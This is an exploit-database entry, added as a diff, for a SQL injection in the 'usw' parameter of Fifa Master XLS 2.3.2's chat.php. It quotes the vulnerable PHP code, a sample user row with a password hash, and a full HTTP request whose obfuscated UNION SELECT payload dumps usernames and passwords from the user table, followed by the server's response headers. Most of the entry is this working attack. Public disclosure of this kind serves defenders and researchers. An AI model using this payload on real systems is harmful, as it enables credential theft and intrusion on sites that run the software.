@@ -1,0 +1,61 @@
+# Exploit Title: Fifa Master XLS 2.3.2 - 'usw' SQL Injection
+# Dork: N/A
+# Date: 2018-10-24
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://fankstribe.org/
+# Software Link: https://sourceforge.net/projects/fifamasterxls/files/latest/download
+# Version: 2.3.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/chat.php?action=chatname&usw=[SQL]
+# 
+# Registered users can run...
+/* `exploitdb`.`f_user` */
+$f_user = array(
+  array('userID' => '2','access' => 'Registered','userName' => 'efe','firstname' => 'efe','lastName' => 'efe','userEmail' => 'efe@omerefe.com','userPassword' => 'a0b92793d636e4ccee294c6548cb35b3','avatar' => '0.jpg','ban' => '0')
+);
+# 
+
+# [PATH]/chat.php 166
+# 
+# 163 function chatName() {
+# 164 	$un = '';
+# 165 	global $con;
+# 166 $su=$_GET['usw'];
+# 167 
+# 168 $sc2=mysql_query("select userName from f_user where userID='$su' limit 1");
+# 169 while($row_sc2=mysql_fetch_array($sc2))
+# 170 {
+
+# [PATH]/js/chat.js 337
+# 
+# 336 jQuery.ajax({
+# 337 url: "chat.php?action=chatname&usw="+item.f,
+# 338 cache: false,
+# 339 dataType: "json",
+# 340 async: false,
+# 341 success: function(data)
+  
+GET /[PATH]/chat.php?action=chatname&usw=-%27++uNiOn+sElecT++(seLEcT(@x)FRom(SElecT(@x:=0x00)%20,(sELeCt(@x)fRom(f_user)whERe(@x)In(@x:=conCat(0x20,@x,0x557365726e616d653a20,userName,0x3c62723e,0x506173733a20,userPassword,0x3c62723e))))x)--+- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=io5hsssef7l7nich1si2gk99k5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 23 Oct 2018 00:12:37 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 148
+Keep-Alive: timeout=5, max=1
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
